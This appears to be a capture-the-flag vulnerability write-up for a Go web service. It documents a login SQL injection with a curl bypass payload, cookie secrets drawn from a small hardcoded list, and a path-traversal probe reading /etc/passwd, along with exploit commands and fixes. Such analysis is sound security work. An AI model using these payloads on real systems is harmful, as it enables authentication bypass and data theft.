# MSPD CTF - Vulnerability Analysis

## Critical Vulnerabilities Found

### 1. **SQL Injection (CRITICAL)** 
**Location:** `service/app_logic/handlers/authorization.go:14`

**Vulnerable Code:**
```go
queryResult := db.DB.Select("id, username, password").First(&user, fmt.Sprintf("username = '%v' AND password = '%v'", user.Username, user.Password))
```

**Issue:** Uses `fmt.Sprintf` for string interpolation instead of parameterized queries.

**Exploit:**
```bash
curl -X POST http://localhost:1015/authorize \
  -d "username=' OR '1'='1' --&password=anything"
```

**Impact:** 
- Complete authentication bypass
- Data extraction via UNION-based injection
- Potential database manipulation

---

### 2. **Predictable Cookie Secret Keys (HIGH)**
**Location:** `service/app_logic/utils/cookies.go` and `service/config/config.go`

**Vulnerable Code:**
```go
// cookies.go
SC = securecookie.New([]byte(config.KeyDict[rand.Int()%len(config.KeyDict)]), 
                       []byte(config.KeyDict[rand.Int()%len(config.KeyDict)]))

// config.go
KeyDict = [10]string{"nerisande", "neriael", "neriyuko", ...}
```

**Issue:** 
- Only 10 hardcoded keys
- Keys are padded to 32 chars with zeros (predictable)
- Random selection from small dictionary

**Impact:**
- Cookie forgery possible
- Session hijacking

---

### 3. **Potential Path Traversal (MEDIUM)**
**Location:** `service/app_logic/router/routes.go`

**Vulnerable Code:**
```go
http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
```

**Issue:** File server may allow directory traversal.

**Test:**
```bash
curl http://localhost:1015/static/../../etc/passwd
```

---

## Quick Exploit Usage

```bash
# Run the exploit
python3 exploit.py http://localhost:1015

# Manual SQL injection
curl -v -X POST http://localhost:1015/authorize \
  -d "username=admin' OR '1'='1' --&password=test" \
  -c cookies.txt

# Access protected resource
curl -b cookies.txt http://localhost:1015/sus_browser
```

## Fix Recommendations

1. **Use parameterized queries:**
   ```go
   db.DB.Where("username = ? AND password = ?", user.Username, user.Password).First(&user)
   ```

2. **Use cryptographically secure random keys:**
   ```go
   key := securecookie.GenerateRandomKey(32)
   SC = securecookie.New(key, nil)
   ```

3. **Sanitize file paths:**
   - Use `path.Clean()` and validate against base directory
